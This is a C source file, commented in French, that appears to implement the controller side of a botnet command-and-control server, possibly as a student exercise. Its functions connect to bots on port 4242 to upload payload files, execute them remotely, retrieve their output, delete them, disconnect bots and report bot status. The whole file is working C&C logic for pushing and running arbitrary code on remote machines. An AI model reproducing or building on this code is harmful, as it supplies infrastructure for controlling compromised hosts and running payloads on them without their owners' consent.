#include "gestionBot.h"

/*****************************************************/
/**Fonctions pour envoyer les commandes au(x) bot(s)**/
/*****************************************************/

extern ptr_liste_sock sock;
extern ptr_liste liste;

FILE* testConnexion(char* hote){
  ptr_liste_sock s = sock;
  while(s!=NULL){
    if(strcmp(s->hote,hote)==0)
      return s->dialogue;
    else s=s->next;
  }
  int sck=connexionServeurTCP(hote,"4242");
  if(sck<0)
    return NULL;
  FILE* dialogue=fdopen(sck,"a+");
  ajout_socket(&sock,hote,dialogue);
  return sock->dialogue;
}

/*******************************************/
/***** Installation d'une charge utile *****/
/*******************************************/

/* Fonction d'installation en communication avec le bot */
int askInstallToBot(int name_length, char* name, int content_length, unsigned char* content, char* host){
     char tampon[MAX_TAMPON];
     FILE* dialogue = testConnexion(host);
     if (dialogue==NULL)
	     return -1;

    fprintf(dialogue,"upload?\n");
     while(fgets(tampon,MAX_TAMPON,dialogue)!=NULL){
	     if(strcmp(tampon,"OKupload\n")==0)
		     fprintf(dialogue,"%d\n",name_length);
	     else if(strcmp(tampon,"OKname_size\n")==0)
		     fprintf(dialogue,"%s\n",name);
	     else if(strcmp(tampon,"OKname\n")==0)
		     fprintf(dialogue,"%d\n",content_length);
	     else if(strcmp(tampon,"OKdata_size\n")==0){
		     int i=0;
		     while(i<content_length){
			        fwrite(content+i,1,1,dialogue);
              i++;
		     }
	     }
	     else if(strcmp(tampon,"bye\n")==0){
		       fprintf(dialogue,"bye\n");
		       break;
	     }
     }
     return 0;
}

/* Fonction d'intallation en local (admin) */
int installChargeLocal(char *ip, char* charge){
  char chemin[T_CHEMIN]="../dynamic_lib/";
  strcat(chemin,charge);
	struct stat buf;
	FILE* content = fopen(chemin,"r");
  if(content==NULL)
    return -2;
	stat(chemin,&buf);
  int content_length = buf.st_size;

	int name_length=strlen(charge);

	unsigned char* cont = malloc(content_length);
	fread(cont,1,content_length,content);
	int i=askInstallToBot(name_length,charge,content_length,cont,ip);
  free(cont);
	return i;
}

/* Fonction d'installation en distant (server) */
void installChargeSHM(char* host){
  //Taille du nom du fichier
  int* name_length;
  name_length = readSHM_int(KEY_NAME_LENGTH, sizeof(int));

  //Nom du fichier
  char name[*name_length];
  unsigned char* pt_name;
  pt_name = readSHM_unsigned_char(KEY_NAME, *name_length);
  strcpy(name, (char*)pt_name);

  //Taille du contenu du fichier
  int* content_length;
  content_length = readSHM_int(KEY_CONTENT_LENGTH, sizeof(int));

  //Contenu du fichier
  char content[*content_length];
  unsigned char* pt_content;
  pt_content = readSHM_unsigned_char(KEY_CONTENT, *content_length);
  strcpy(content, (char*)pt_content);

  //Envoi de la charge au bot
  int installation;
  installation = askInstallToBot(*name_length, name, *content_length, pt_content, host);

  shmid_installation = createSHM(KEY_INSTALLATION, sizeof(int));

  writeSHM_int(KEY_INSTALLATION, &installation, sizeof(int));

  kill(*server_pid, SIGUSR2);

  while(received_SHM != 1){}
  received_SHM = 0;

  //Détachement
  detachSHM(pt_content);
  detachSHM(content_length);
  detachSHM(pt_name);
  detachSHM(name_length);

  deleteSHM(shmid_installation);
}

/****************************************/
/***** Exécution d'une charge utile *****/
/****************************************/

/* Fonction d'exécution en communication avec le bot */
int askRunToBot(int name_length, char* name, char* host){
	int index;
  FILE* dialogue=testConnexion(host);
  if(dialogue==NULL)
    return -2;

  char file[MAX_TAMPON];

  fprintf(dialogue,"execute?\n");
  while(fgets(file,MAX_TAMPON,dialogue)!=NULL){
  	if(strcmp(file, "OKexecute\n") == 0)
      	fprintf(dialogue, "%d\n", name_length);
    else if(strcmp(file, "OKname_size\n") == 0)
      	fprintf(dialogue, "%s\n", name);
    else if(strcmp(file, "NOKname\n") == 0)
      	return -1;
    else if(strcmp(file, "OKname\n") == 0){
        while(1){
          if(fgets(file,MAX_TAMPON,dialogue)!=NULL){
            sscanf(file,"%d",&index);
            break;
          }
        }
      	fprintf(dialogue, "OKid\n");
    }
    else if(strcmp(file, "bye\n") == 0){
      fprintf(dialogue, "bye\n");
			break;
		}
  }
  return index;
}

/* Fonction d'exécution en local (admin) */
int runChargeLocal(char *ip, char* charge){
  int name_length=strlen(charge);
  return askRunToBot(name_length,charge,ip);
}

/* Fonction d'exécution en distant (server) */
void runChargeSHM(char* host){
  int index = 0;

  //Taille du nom du fichier
  int* name_length;
  name_length = readSHM_int(KEY_NAME_LENGTH, sizeof(int));

  //Nom du fichier
  char name[*name_length];
  unsigned char* pt_name;
  pt_name = readSHM_unsigned_char(KEY_NAME, *name_length);
  strcpy(name, (char*)pt_name);

  //Envoi de la charge au bot
  index = askRunToBot(*name_length, name, host);

  shmid_running = createSHM(KEY_RUNNING, sizeof(int));
  writeSHM_int(KEY_RUNNING, &index, sizeof(int));

  kill(*server_pid, SIGUSR2);

  while(received_SHM != 1){}
  received_SHM = 0;

  //Détachement
  detachSHM(pt_name);
  detachSHM(name_length);

  deleteSHM(shmid_running);
}

/**********************************************/
/***** Résultat d'une exécution de charge *****/
/**********************************************/

/* Fonction de résultat en communication avec le bot */
char* askResultToBot(int indx, char* host){
  int result_size;
  char n[T_NAME_RESULT]="resultIndex";
  char ind[5];   //9999 id possibles
  sprintf(ind,"%d",indx);
  strcat(n,ind);
  char chemin[T_CHEMIN]="./resultats/";
  strcat(chemin,n);

  char *name=malloc(T_NAME_RESULT);
  strcpy(name,n);
  FILE* dialogue=testConnexion(host);
  if(dialogue==NULL){ strcpy(name,"errorConnexion\n"); return name; }

  char file[MAX_TAMPON];

  fprintf(dialogue,"result?\n");
  while(fgets(file,MAX_TAMPON,dialogue)!=NULL){
    if(strcmp(file, "OKresult\n") == 0)
      	fprintf(dialogue, "%d\n", indx);
    else if(strcmp(file,"NOKid\n")==0){
        strcpy(name,"error\n");
        return name;
    }
    else if(strcmp(file,"OKid\n")==0){
        if(fgets(file,MAX_TAMPON,dialogue)!=NULL){
          sscanf(file,"%d",&result_size);
        }

        fprintf(dialogue,"OKresult_size\n");

        unsigned char result_content[result_size];
  			FILE* c = fopen(chemin,"w+");
  			int i=0;
  			while(i<result_size)
  				i+=fread(result_content+i,1,1,dialogue);

  			i=fwrite(result_content,1,result_size,c);
  			if(i!=result_size)
  				perror("erreur sauvegarde charge");

  			fclose(c);
        fprintf(dialogue,"bye\n");
        if(fgets(file,MAX_LIGNE,dialogue)!=NULL){
          if(strcmp(file,"bye\n")==0){
            break;
          }
        }
    }
  }
  return name;
}

/*Fonction de résultat en distant (server)*/
void resultRunningSHM(char* host){
  //Taille du nom du fichier
  int* index;
  index = readSHM_int(KEY_CHARGE_INDEX, sizeof(int));

  //Demande du résultat
  char* result_id;
  result_id = askResultToBot(*index, host);

  int result_size;
  char* result;

  if(strcmp(result_id, "error\n") == 0){
    result = result_id;
    result_size = strlen(result);
  }
  else{
    char path[T_CHEMIN] = "./resultats/";
    strcat(path, result_id);

    FILE* result_file = fopen(path, "r");
    if(result_file == NULL){
      perror("C&C > Opening result file failed"); exit(1);
    }

    fseek(result_file, 0, SEEK_END);
    int result_size = ftell(result_file);

    fseek(result_file, 0, SEEK_SET);
    result = (char*)malloc((result_size+1)*sizeof(char));
    fread(result, result_size, 1, result_file);

    fclose(result_file);

    result[result_size]='\0';
  }

  shmid_result_length = createSHM(KEY_RESULT_LENGTH, sizeof(int));
  shmid_result = createSHM(KEY_RESULT, result_size);

  writeSHM_int(KEY_RESULT_LENGTH, &result_size, sizeof(int));
  writeSHM_unsigned_char(KEY_RESULT, (unsigned char*)result, result_size);

  kill(*server_pid, SIGUSR2);

  while(received_SHM != 1){}
  received_SHM = 0;

  free(result);

  //Détachement
  detachSHM(index);

  deleteSHM(shmid_result);
  deleteSHM(shmid_result_length);
}

/******************************************/
/***** Suppression d'une charge utile *****/
/******************************************/

/* Fonction de suppression d'une charge en communication avec le bot */
int askRemoveToBot(char* host, char* name){
  FILE* dialogue=testConnexion(host);
  if(dialogue==NULL)
    return -2;
  int name_length=strlen(name);
  char file[MAX_TAMPON];

  fprintf(dialogue,"delet?\n");
  while(fgets(file,MAX_TAMPON,dialogue)!=NULL){
    if(strcmp(file, "OKdelet\n") == 0)
      	fprintf(dialogue, "%d\n", name_length);
    else if(strcmp(file, "OKname_size\n") == 0)
        fprintf(dialogue,"%s\n",name);
    else if(strcmp(file, "OKname\n") == 0){
        fprintf(dialogue,"bye\n");
    }
    else if(strcmp(file,"bye\n") == 0){
        return 0;
    }
    else if(strcmp(file, "NOKname\n") == 0){
        return -1;
    }
  }
  return -1;
}

/* Fonction de suppression en distant (server) */
void removeChargeSHM(char* host){
  //Taille du nom du fichier
  int* name_length;
  name_length = readSHM_int(KEY_NAME_LENGTH, sizeof(int));

  //Nom du fichier
  char name[*name_length];
  unsigned char* pt_name;
  pt_name = readSHM_unsigned_char(KEY_NAME, *name_length);
  strcpy(name, (char*)pt_name);

  //Envoi de la charge au bot
  int r = askRemoveToBot(host, name);
  if(r<0)
    printf("C&C > Payload doesn't exist\n");
  else
    printf("C&C > Payload deleted\n");

  shmid_delete = createSHM(KEY_DELETE, sizeof(int));
  writeSHM_int(KEY_DELETE, &r, sizeof(int));

  kill(*server_pid, SIGUSR2);

  while(received_SHM != 1){}
  received_SHM = 0;

  deleteSHM(shmid_delete);

  //Détachement
  detachSHM(pt_name);
  detachSHM(name_length);
}

/***************************************/
/***** Déconnexion d'un bot (QUIT) *****/
/***************************************/

/* Fonction de déconnexion en communication avec le bot */
int askDisconnectToBot(char* hote, ptr_liste_sock* s){
  if(*s==NULL)
    return -1;

  else if(strcmp((*s)->hote,hote)==0){
    FILE* d = (*s)->dialogue;
    fprintf(d,"QUIT\n");
    supprimer_socket(s);
    return 0;
  }

  else return askDisconnectToBot(hote,&((*s)->next));
}

/* Fonction de déconnexion en distant (server) */
void disconnectSHM(char* host){
  //Déconnexion du bot
  int t = askDisconnectToBot(host, &sock);

  if(t<0)
    printf("C&C > Bot isn't connected\n");
  else
    printf("C&C > Bot disconnected\n");

  shmid_disconnect = createSHM(KEY_DISCONNECT, sizeof(int));
  writeSHM_int(KEY_DISCONNECT, &t, sizeof(int));

  kill(*server_pid, SIGUSR2);

  while(received_SHM != 1){}
  received_SHM = 0;

  deleteSHM(shmid_disconnect);
}

/**********************************/
/***** Statut d'un bot (STAT) *****/
/**********************************/

/* Fonction de statut en communication avec le bot */
char* askStatusToBot(char* host){

  char* status = malloc(MAX_TAMPON);
  char file[MAX_TAMPON];
  char* life=malloc(sizeof(char));
  char* charges=malloc(sizeof(char));
  char* execs=malloc(sizeof(char));
  int i=0,j=0,k=0;

  FILE* dialogue=testConnexion(host);
  if(dialogue==NULL){
    strcat(status,"error\n");
    return status;
  }

  fprintf(dialogue,"STAT\n");
  while(fgets(file,MAX_TAMPON,dialogue)!=NULL){
    while(file[i]!=','){
      memcpy(life+i,file+i,1);
      i++;
      life=realloc(life,i+1);
    }
    memcpy(life+i,"\0",1);
    i++;
    while(file[i]!=','){
      memcpy(charges+j,file+i,1);
      j++;
      i++;
      charges=realloc(charges,j+1);
    }
    memcpy(charges+j,"\0",1);
    i++;
    while(i<(int)strlen(file)-1){
      memcpy(execs+k,file+i,1);
      k++;
      i++;
      execs=realloc(execs,k+1);
    }
    memcpy(execs+k,"\0",1);

    sprintf(status,"Lifetime: %ss, %s payload(s) installed, %s execution(s)\n",life,charges,execs);
    free(life);
    free(charges);
    free(execs);
    break;
  }

  return status;
}

/* Fonction de statut en distant (server) */
void statSHM(char* host){
  //Déconnexion du bot
  char* status = askStatusToBot(host);
  int status_size = strlen(status);

  shmid_status_length = createSHM(KEY_STATUS_LENGTH, sizeof(int));
  writeSHM_int(KEY_STATUS_LENGTH, &status_size, sizeof(int));

  shmid_status = createSHM(KEY_STATUS, status_size);
  writeSHM_unsigned_char(KEY_STATUS, (unsigned char*)status, status_size);

  kill(*server_pid, SIGUSR2);

  while(received_SHM != 1){}
  received_SHM = 0;

  deleteSHM(shmid_status);
  deleteSHM(shmid_status_length);
}
